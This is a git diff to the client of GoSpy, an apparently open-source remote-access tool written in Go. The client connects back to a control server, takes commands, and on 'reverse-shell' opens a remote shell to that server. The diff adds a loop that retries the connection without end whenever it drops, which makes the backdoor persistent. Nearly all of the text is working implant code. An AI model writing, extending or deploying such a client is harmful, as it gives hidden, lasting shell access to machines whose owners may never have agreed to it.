@@ -3,42 +3,28 @@ package main
 import (
 	"flag"
 	"github.com/psidex/GoSpy/internal/comms"
-	"github.com/psidex/GoSpy/internal/gospy/shell"
+	"github.com/psidex/GoSpy/internal/gospy/commands"
 	"log"
 	"net"
 	"os"
+	"time"
 )
 
-// ToDo: What happens if server drops?
+var serverAddress string
+var serverPassword string
 
-func main() {
-	address := flag.String("a", "127.0.0.1:12345", "the address (ip:port) of the gospyserver to connect to")
-	password := flag.String("p", "", "the password to encrypt network data with")
-	flag.Parse()
-
-	log.Printf("Using address %s\n", *address)
-
-	conn, err := net.Dial("tcp", *address)
-	if err != nil {
-		log.Fatal(err)
-	}
-
-	var cm comms.PacketManager
-
-	if *password != "" {
-		cm = comms.NewEncryptedConn(conn, *password)
-	} else {
-		cm = comms.NewPlainConn(conn)
-	}
-
+// commandLoop is the loop that receives commands and executes them.
+// This should only return an err has occurred and it is impossible to continue as is (i.e. network dropped).
+func commandLoop(cm comms.ConnectionManager) (err error) {
 	for {
-		messageBytes, err := cm.RecvBytes()
+		var messageBytes []byte
+		messageBytes, err = cm.RecvBytes()
 		if err != nil {
-			log.Fatal(err)
+			break
 		}
 
 		message := string(messageBytes)
-		log.Printf("Recv: %s", string(message))
+		log.Printf("Recv: %s", message)
 
 		switch message {
 
@@ -47,17 +33,48 @@ func main() {
 			os.Exit(0)
 
 		case "ping":
-			err = cm.SendBytes([]byte("pong"))
-			if err != nil {
-				log.Printf("pong failed: %s\n", err.Error())
+			if commands.SendPong(cm) != nil {
+				break
 			}
 
 		case "reverse-shell":
-			err = shell.StartReverseShell(cm)
-			if err != nil {
-				log.Printf("reverse-shell failed: %s\n", err.Error())
-			}
-
+			// Run in a goroutine so that it can abandoned by the client (e.g. if it hangs forever) and this loop will
+			// still respond.
+			go commands.StartReverseShell(serverAddress, serverPassword)
 		}
+	}
+	return err
+}
+
+func main() {
+	address := flag.String("a", "127.0.0.1:12345", "the address (ip:port) of the gospyserver to connect to")
+	password := flag.String("p", "", "the password to encrypt network data with")
+	flag.Parse()
+
+	serverAddress = *address
+	serverPassword = *password
+
+	if serverAddress != "" {
+		log.Println("Password supplied, using encrypted connection")
+	}
+
+	// If the connection drops it just kicks back this loop.
+	for {
+		log.Printf("Attempting connection to address: %s\n", serverAddress)
+		conn, err := net.DialTimeout("tcp", serverAddress, time.Second*30)
+		if err != nil {
+			continue
+		}
+
+		var cm comms.ConnectionManager
+
+		if serverPassword != "" {
+			cm = comms.NewEncryptedConn(conn, serverPassword)
+		} else {
+			cm = comms.NewPlainConn(conn)
+		}
+
+		err = commandLoop(cm)
+		log.Printf("Connection dropped: %s\n", err.Error())
 	}
 }
